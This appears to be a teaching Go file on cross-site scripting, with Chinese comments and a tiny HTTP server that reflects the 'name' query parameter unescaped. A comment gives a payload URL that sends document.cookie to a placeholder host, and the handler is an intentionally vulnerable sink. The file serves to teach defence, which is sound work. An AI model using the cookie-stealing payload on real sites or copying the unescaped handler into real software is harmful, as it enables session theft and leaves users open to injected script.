package main

import (
	"fmt"
	"net/http"
)

func init() {
	fmt.Println(" 避免XSS攻击")
	//随着互联网技术的发展，现在的Web应用都含有大量的动态内容以提高用户体验。所谓动态内容，就是应用程序能够根据用户环境和用户请求，输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。

}

func main() {
	//什么是XSS
	//XSS攻击：跨站脚本攻击(Cross-Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。XSS是一种常见的web安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。不同于大多数攻击(一般只涉及攻击者和受害者)，XSS涉及到三方，即攻击者、客户端与Web应用。XSS的攻击目标是为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。
	//
	//XSS通常可以分为两大类：一类是存储型XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为:恶意用户的Html输入Web程序->进入数据库->Web程序->用户浏览器。另一类是反射型XSS，主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。


	//XSS目前主要的手段和目的如下：
	//
	//盗用cookie，获取敏感信息。
	//利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
	//利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。
	//利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
	//在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果



	//  todo  XSS的原理
	//Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。
	//
	//接下来以反射性XSS举例说明XSS的过程：现在有一个网站，根据参数输出用户的名称，例如访问url：http://127.0.0.1/?name=astaxie，就会在浏览器输出如下信息：
	//
	//hello astaxie
	helloDemo()
	//如果我们传递这样的url：http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;,这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，如下这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。你也许会说，这样的URL一看就有问题，怎么会有人点击？，是的，这类的URL会让人怀疑，但如果使用短网址服务将之缩短，你还看得出来么？攻击者将缩短过后的url通过某些途径传播开来，不明真相的用户一旦点击了这样的url，相应cookie数据就会被发送事先设定好的站点，这样子就盗得了用户的cookie信息，然后就可以利用Websleuth之类的工具来检查是否能盗取那个用户的账户。
	//
	//更加详细的关于XSS的分析大家可以参考这篇叫做《新浪微博XSS事件分析》的文章。




	//如何预防XSS
	//答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。
	//
	//目前防御XSS主要有如下几种方式：
	//
	//过滤特殊字符
	//
	//避免XSS的方法之一主要是将用户所提供的内容进行过滤，Go语言提供了HTML的过滤函数：
	//
	//text/template包下面的HTMLEscapeString、JSEscapeString等函数
	//
	//使用HTTP头指定类型
	//
	//`w.Header().Set("Content-Type","text/javascript")`
	//
	//这样就可以让浏览器解析javascript代码，而不会是html输出。

	//总结
	//XSS漏洞是相当有危害的，在开发Web应用的时候，一定要记住过滤数据，特别是在输出到客户端之前，这是现在行之有效的防止XSS的手段。

}



func helloDemo() {
	http.HandleFunc("/",helloDemoExtend)
	http.ListenAndServe(":9090",nil)
}

func helloDemoExtend(w http.ResponseWriter,r *http.Request)  {
	r.ParseForm()
	 name:=r.Form["name"]
	  fmt.Println("name",name)
     //第二个参数是string
	 fmt.Fprintf(w,"name="+name[0])
	 //fmt.Fprintf(w,"haha")
}
